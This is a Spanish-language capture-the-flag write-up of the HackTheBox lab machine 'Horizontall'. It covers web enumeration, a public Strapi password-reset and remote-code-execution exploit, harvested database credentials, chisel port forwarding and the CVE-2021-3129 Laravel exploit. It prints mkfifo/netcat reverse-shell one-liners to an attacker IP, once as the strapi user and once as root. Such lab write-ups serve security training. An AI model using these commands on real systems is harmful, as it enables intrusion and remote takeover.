---
title: Horizontall
date: 2024-06-30 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
- CVE-2021-3129
- Information Leakage
- Remote Port Forwarding
- Strapi
- Laravel
image:
  path: /assets/img/Horizontall/Horizontall.png
---

## Skills

- Information Leakage
- Port Forwarding
- Strapi CMS Exploitation
- Laravel Exploitation
  
## Certificaciones

- eWPT
- eJPT
  
## Descripción

`Horizontall` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de su `api` de `strapi`, listaremos sus `subdominios` y explotaremos una versión antigua desactualizada de `strapi` accediendo a la máquina víctima. Una vez dentro realizaremos un `remote port forwarding` y explotaremos el `CVE-2021-3129` obteniendo así el usuario `root`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.95.96
PING 10.129.95.96 (10.129.95.96) 56(84) bytes of data.
64 bytes from 10.129.95.96: icmp_seq=1 ttl=63 time=47.7 ms
64 bytes from 10.129.95.96: icmp_seq=2 ttl=63 time=37.7 ms
^C
--- 10.129.95.96 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 37.662/42.667/47.672/5.005 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.95.96 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 15:09 CEST
Initiating SYN Stealth Scan at 15:09
Scanning 10.129.95.96 [65535 ports]
Discovered open port 22/tcp on 10.129.95.96
Discovered open port 80/tcp on 10.129.95.96
Completed SYN Stealth Scan at 15:09, 11.13s elapsed (65535 total ports)
Nmap scan report for 10.129.95.96
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 22,80 10.129.95.96 -oN services                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 15:11 CEST
Nmap scan report for 10.129.95.96
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds
```

### Web Enumeration

Nos dirigimos a la página web y se visualiza lo siguiente:

![](/assets/img/Horizontall/image_1.png)

Abrimos el `/etc/hosts` y añadimos el dominio `horizontall.htb`, debemos hacer esto debido a que estamos ante un `virtual hosting` 

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.95.96    horizontall.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Ahora al acceder a la página web nos encontramos lo siguiente

![](/assets/img/Horizontall/image_2.png)

Debido a que en la página web no hay nada que nos llame la atención vamos a `fuzzear` en busca de `subdominios`

```
# wfuzz -c -t 200 --hc 404 --hh 194 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.horizontall.htb' http://horizontall.htb    
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000001:   200        1 L      43 W       901 Ch      "www"                                                                                                                 
000047093:   200        19 L     33 W       413 Ch      "api-prod"  
```

Los `subdominios` encontrados los `añadimos` al `/etc/hosts`

```
27.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.95.96    api-prod.horizontall.htb www.horizontall.htb horizontall.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

En principio `www.horizontall.htb` nos muestra el mismo contenido que `horizontall.htb`, sin embargo cuando accedemos a `api-prod.horizontal.htb` nos muestra esto

![](/assets/img/Horizontall/image_3.png)

Fuzzeamos `api-prod.horizontal.htb` en busca de nuevas rutas y nos encontramos `users`,`reviews`y `admin`

```
# wfuzz -c -t 200 --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000014:   200        19 L     33 W       413 Ch      "http://api-prod.horizontall.htb/"                                                                                    
000000011:   200        19 L     33 W       413 Ch      "# Priority ordered case-sensitive list, where entries were found"                                                    
000000007:   200        19 L     33 W       413 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                     
000000003:   200        19 L     33 W       413 Ch      "# Copyright 2007 James Fisher"                                                                                       
000000012:   200        19 L     33 W       413 Ch      "# on at least 2 different hosts"                                                                                     
000000013:   200        19 L     33 W       413 Ch      "#"                                                                                                                   
000000001:   200        19 L     33 W       413 Ch      "# directory-list-2.3-medium.txt"                                                                                     
000000010:   200        19 L     33 W       413 Ch      "#"                                                                                                                   
000000008:   200        19 L     33 W       413 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                          
000000004:   200        19 L     33 W       413 Ch      "#"                                                                                                                   
000000006:   200        19 L     33 W       413 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                       
000000005:   200        19 L     33 W       413 Ch      "# This work is licensed under the Creative Commons"                                                                  
000000002:   200        19 L     33 W       413 Ch      "#"                                                                                                                   
000000009:   200        19 L     33 W       413 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                 
000000202:   403        0 L      1 W        60 Ch       "users"                                                                                                               
000000137:   200        0 L      21 W       507 Ch      "reviews"                                                                                                             
000003701:   403        0 L      1 W        60 Ch       "Users"                                                                                                               
000006098:   200        16 L     101 W      854 Ch      "Admin"                                                                                                               
000029309:   200        0 L      21 W       507 Ch      "REVIEWS"                                                                                                             
000001609:   200        0 L      21 W       507 Ch      "Reviews"                                                                                                             
000000259:   200        16 L     101 W      854 Ch      "admin"                                                                                                               
000045240:   200        19 L     33 W       413 Ch      "http://api-prod.horizontall.htb/"                                                                                    
000064268:   400        0 L      4 W        69 Ch       "%C0"    
```

En `api-prod.horizontall.htb/users` nos encontramos esto

![](/assets/img/Horizontall/image_4.png)

En `api-prod.horizontall.htb/reviews` nos encontramos esto

![](/assets/img/Horizontall/image_5.png)

En `api-prod.horizontall.htb/admin` nos encontramos esto

![](/assets/img/Horizontall/image_6.png)

Si usamos `wappalyzer` para ver con que está `creada` la `web` podemos ver que está usando un `cms` llamado `strapi`

![](/assets/img/Horizontall/image_7.png)

`Fuzzeamos` en busca de nuevas `rutas`, para saber la `version` del cms `strapi`, podemos utilizar la `api` de `strapi` que se aloja en `/init`

```
# wfuzz -c -t 200 --hc 404 --hh 854 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/admin/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000664:   200        0 L      1 W        90 Ch       "layout"                                                                                                              
000000519:   403        0 L      1 W        60 Ch       "plugins"                                                                                                             
000007404:   200        0 L      1 W        144 Ch      "init"                                                                                                                
000010316:   403        0 L      1 W        60 Ch       "Plugins"                                                                                                             
000034632:   200        0 L      1 W        90 Ch       "Layout"                                                                                                              
000070792:   200        0 L      1 W        144 Ch      "Init"    
```

Al acceder a `api-prod.horizontall.htb/admin/init` podemos ver la `versión` de `strapi` 

![](/assets/img/Horizontall/image_8.png)

## Intrusión

Ahora que tenemos la `versión` podemos usar `searchploit` para ver si existe algún `exploit` para esta versión de `strapi`, efectivamente existen varios exploits para esta versión

```
# searchsploit strapi 
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                   | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                 | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                           | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                             | nodejs/webapps/50716.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nos `descargamos` el `exploit` 

```
# searchsploit -m multiple/webapps/50239.py
```

`Ejecutamos` el `exploit`

```
# python3 50239.py http://api-prod.horizontall.htb 
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE5NjcwMTYwLCJleHAiOjE3MjIyNjIxNjB9.ivf2fe4XqiwXdBhYFi1f0FtvhVuAQ2475eyuJCVhwUw


$> ping 10.10.16.8
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output 
```

Nos ponemos en `escucha` en espera de `trazas icmp` y efectivamente `tenemos` un `RCE`

```
# sudo tcpdump -i tun0 icmp                
[sudo] password for justice-reaper: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:10:09.152890 IP api-prod.horizontall.htb > 10.10.16.8: ICMP echo request, id 4371, seq 1, length 64
16:10:09.152933 IP 10.10.16.8 > api-prod.horizontall.htb: ICMP echo reply, id 4371, seq 1, length 64
16:10:10.154908 IP api-prod.horizontall.htb > 10.10.16.8: ICMP echo request, id 4371, seq 2, length 64
16:10:10.154946 IP 10.10.16.8 > api-prod.horizontall.htb: ICMP echo reply, id 4371, seq 2, length 64
16:10:11.156630 IP api-prod.horizontall.htb > 10.10.16.8: ICMP echo request, id 4371, seq 3, length 64
16:10:11.156651 IP 10.10.16.8 > api-prod.horizontall.htb: ICMP echo reply, id 4371, seq 3, length 64
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

Por lo tanto vamos a mandarnos una `reverse shell` a nuestro equipo, lo primero es ponernos en escucha mediante `netcat` por el puerto `443`

```
# nc -nlvp 443
```

Nos mandamos una `reverse shell` a nuestro equipo

```
$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.8 443 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`

```
# nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.129.95.96] 53600
sh: 0: can't access tty; job control turned off
$ 
```

Obtenemos las `dimensiones` de nuestra `pantalla` 

```
# stty size
45 183
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

Ya tenemos un `consola` completamente `interactiva`

```
strapi@horizontall:~/myapi$ whoami
strapi
```

## Privilege Escalation

Inspeccionando el código me he encontrado con estas `credenciales` del usuario `developer`

```
strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

Intentamos ver si el usuario `developer` utiliza las misma `contraseña` para su usuario en el `sistema` y para la `base de datos`. Nos damos cuenta que solo existe un usuario, y es el que nos ha creado el exploit, por lo tanto no hay nada interesante en la base de datos. Tampoco podemos reutilizar la contraseña para convertirnos en el usuario developer

```
strapi@horizontall:~/myapi/config/environments/development$ su developer
Password: 
su: Authentication failure
strapi@horizontall:~/myapi/config/environments/development$ mysql -u developer
ERROR 1045 (28000): Access denied for user 'developer'@'localhost' (using password: NO)
strapi@horizontall:~/myapi/config/environments/development$ !! -p
mysql -u developer -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 23
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| strapi             |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use strapi;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------+
| Tables_in_strapi             |
+------------------------------+
| core_store                   |
| reviews                      |
| strapi_administrator         |
| upload_file                  |
| upload_file_morph            |
| users-permissions_permission |
| users-permissions_role       |
| users-permissions_user       |
+------------------------------+
8 rows in set (0.00 sec)

mysql> describe strapi_administrator;
+--------------------+--------------+------+-----+---------+----------------+
| Field              | Type         | Null | Key | Default | Extra          |
+--------------------+--------------+------+-----+---------+----------------+
| id                 | int(11)      | NO   | PRI | NULL    | auto_increment |
| username           | varchar(255) | NO   | MUL | NULL    |                |
| email              | varchar(255) | NO   |     | NULL    |                |
| password           | varchar(255) | NO   |     | NULL    |                |
| resetPasswordToken | varchar(255) | YES  |     | NULL    |                |
| blocked            | tinyint(1)   | YES  |     | NULL    |                |
+--------------------+--------------+------+-----+---------+----------------+
6 rows in set (0.00 sec)

mysql> select username,password from strapi_administrator;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2a$10$Ad/YtYwnQ9H8acqSFbf3yOvrelFhmcj9yW0u0alLAScfRb1C1s1NG |
+----------+--------------------------------------------------------------+
1 row in set (0.00 sec)
```

Vamos a `ver` los `servicios` internos

```
strapi@horizontall:/tmp/scripts$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
tcp        0      0 10.129.95.96:53600      10.10.16.8:443          ESTABLISHED
tcp        0    138 10.129.95.96:53612      10.10.16.8:443          ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN    
```

El que más me llama la atención es el que se aloja en el `puerto 8000`

```
strapi@horizontall:/tmp/scripts$ curl http://127.0.0.1
```

Al hacerle un `curl`, vemos que está corriendo `Laravel v8 (PHP v7.4.18)`, al hacer una búsqueda son `searchsploit` nos encontramos un `exploit` para esta version de Laravel. Mediante `remote port forwarding` vamos a traernos el `puerto 8000` de la `máquina víctima` a `nuestro equipo`. Lo primero que debemos hacer es descargarnos este release [https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_darwin_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_darwin_amd64.gz)

La descomprimimos

```
# gunzip chisel_1.9.1_darwin_amd64.gz
```

Nos ponemos en `escucha` con python en el `mismo directorio` donde se encuentra el archivo de chisel

```
# python -m http.server 80
```

Nos `descargamos` el `archivo` en la máquina víctima

```
# wget http://10.10.16.8/chisel_1.9.1_darwin_amd64.gz`
```

Desde la máquina víctima `ejecutamos` estas `instrucciones`

```
strapi@horizontall:/tmp/scripts$ ./chisel_1.9.1_linux_amd64 client 10.10.16.8:1234 R:8000:127.0.0.1:8000 
```

Desde nuestro equipo `ejecutamos` estas `instrucciones`

```
# ./chisel_1.9.1_linux_amd64 server -p 1234 --reverse  
```

Una vez ejecutados estos comandos podemos visualizar la página accediendo a `http://localhost:8000/`

Buscando un exploit para esta versión de laravel nos encontramos con [https://github.com/nth347/CVE-2021-3129_exploit.git](https://github.com/nth347/CVE-2021-3129_exploit.git)

Debido a que hemos hecho `remote port forwarding` podemos `ejecutar` el `exploit` en nuestra máquina local. Efectivamente el exploit funciona y obtenemos `ejecución de comandos` como usuario `root`

```
# ./exploit.py http://localhost:8000 Monolog/RCE1 id
/home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 4239, done.
remote: Counting objects: 100% (1133/1133), done.
remote: Compressing objects: 100% (441/441), done.
remote: Total 4239 (delta 746), reused 891 (delta 666), pack-reused 3106
Receiving objects: 100% (4239/4239), 601.51 KiB | 1.63 MiB/s, done.
Resolving deltas: 100% (1859/1859), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```

Vamos a mandarnos una `shell` a nuestro equipo, lo primero nos ponemos en `escucha` por el `puerto 443`

```
# nc -nlvp 443
```

Nos mandamos una `shell` como `root` a nuestro equipo

```
# ./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.8 443 >/tmp/f'
```

Efectivamente ya nos hemos `convertido` en usuario `root`

```
root@horizontall:/home/developer/myproject/public# whoami
root
```
